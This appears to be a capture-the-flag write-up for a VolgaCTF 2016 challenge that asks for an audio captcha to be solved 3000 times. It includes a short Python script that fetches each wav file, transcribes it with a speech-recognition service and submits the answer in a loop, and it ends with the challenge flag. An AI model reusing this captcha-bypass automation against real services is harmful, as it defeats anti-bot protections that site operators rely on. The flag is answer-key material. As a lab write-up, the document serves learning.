### Description
Captcha is a modern simple Turing test for everyday use, for human it's simple, but for bot or a simple neural network captcha can become a hard nut to crack.

You can try to solve it with your AI too, but it definitely can be solved with several lines of code, isnâ€™t it?

#### The Challenge

We are given a website asking us to solve a captcha 3000 times.

The captcha is a wav file of a woman saying a series of numbers.

Enter those numbers and you'll see the counter go down by 1.

The goal of the challenge is to create a script that will automate the process of :

- Downloading the captcha
- Analyzing the content
- Submitting the captcha

... 3000 times.

I decided to use python's SpeechRecognizer module, here is the script used for the solution :

    #!/usr/bin/env python

    import requests
    import speech_recognition


    recognizer = speech_recognition.Recognizer()

    cookies = dict(JSESSIONID='P9vFypsHwI4Tpc0G7vHcdoI6zl0IhDg_SmXiTSRS')
    while True:

        audio_file = requests.get("http://yacst2.2016.volgactf.ru:8090/captcha", cookies=cookies).content

        local_file = open('audio.wav', 'w')
        local_file.write(audio_file)
        local_file.close()

        with speech_recognition.WavFile('audio.wav') as wav:
            audio = recognizer.record(wav)
            captcha = recognizer.recognize_google(audio)
            print "Found " + captcha

        data = { "captcha" : captcha }
        content = requests.post("http://yacst2.2016.volgactf.ru:8090/captcha", data=data, cookies=cookies).content
        print content


Submit the last captcha and obtain the flag :

`FLAG: VolgaCTF{Sound IS L1ke M@th if A+B=C THEN C-B=A}`
